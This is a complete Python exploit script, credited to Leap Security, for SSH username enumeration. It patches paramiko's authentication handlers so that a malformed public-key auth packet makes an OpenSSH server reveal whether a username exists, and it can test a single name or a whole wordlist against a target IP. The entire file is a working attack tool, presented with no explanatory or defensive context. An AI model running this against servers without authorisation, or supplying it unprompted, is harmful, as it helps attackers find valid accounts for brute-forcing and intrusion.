#!/usr/bin/env python3

import argparse
import asyncio
import logging
import os
import paramiko
import socket
import sys


class InvalidUsername(Exception):
    pass

# malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# function that'll be overwritten to malform the packet
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# malicious function to overwrite MSG_SERVICE_ACCEPT handler
def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

# call when username was invalid
def invalid_username(*args, **kwargs):
    raise InvalidUsername()

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

# perform authentication with malicious packet and username
async def check_user(username, target, port, rsa_key, timeout=60):
    sock = socket.socket()
    sock.settimeout(timeout)
    transport = paramiko.transport.Transport(sock)

    try:
        sock.connect((target, int(port)))
    except Exception as e:
        print(f'[-] Connection error: {e}')
        return

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print('[!] Failed to negotiate SSH transport')
        transport.close()
        return

    authenticated = False

    try:
        transport.auth_publickey(username, rsa_key)
    except InvalidUsername:
        print("[-] {} is an invalid username".format(username))
        return False
    except paramiko.ssh_exception.AuthenticationException:
        print("[+] {} is a valid username".format(username))
        return True
    except paramiko.ssh_exception.SSHException as e:
        print(f"[!] Error checking user {username}: {e}")
        return False
    finally:
        transport.close()

async def check_users_wordlist(wordlist, target, port, rsa_key):
    if not os.path.isfile(wordlist):
        print("[!] Wordlist file {} does not exist".format(wordlist))
        return

    with open(wordlist, "r") as f:
        usernames = f.read().splitlines()

    if not usernames:
        print("[!] Wordlist file {} is empty".format(wordlist))
        return

    for username in usernames:
        try:
            success = await check_user(username, target, port, rsa_key)
            if success:
                break
        except Exception as e:
            print("[!] Error checking user {}: {}".format(username, str(e)))
            continue


async def main(args):
    rsa_key = paramiko.RSAKey.generate(2048)
    if args.username:
        await check_user(args.username, args.target, args.port, rsa_key)
    elif args.wordlist:
        await check_users_wordlist(args.wordlist, args.target, args.port, rsa_key)
    else:
        print('Please specify a username with -u or --username, or a wordlist with -w or --wordlist.')
        sys.exit(1)


logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
parser.add_argument('-u', '--username', help="Username to check for validity.")
parser.add_argument('-w', '--wordlist', help="Path to a file containing a list of usernames, one per line.")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

asyncio.run(main(args))
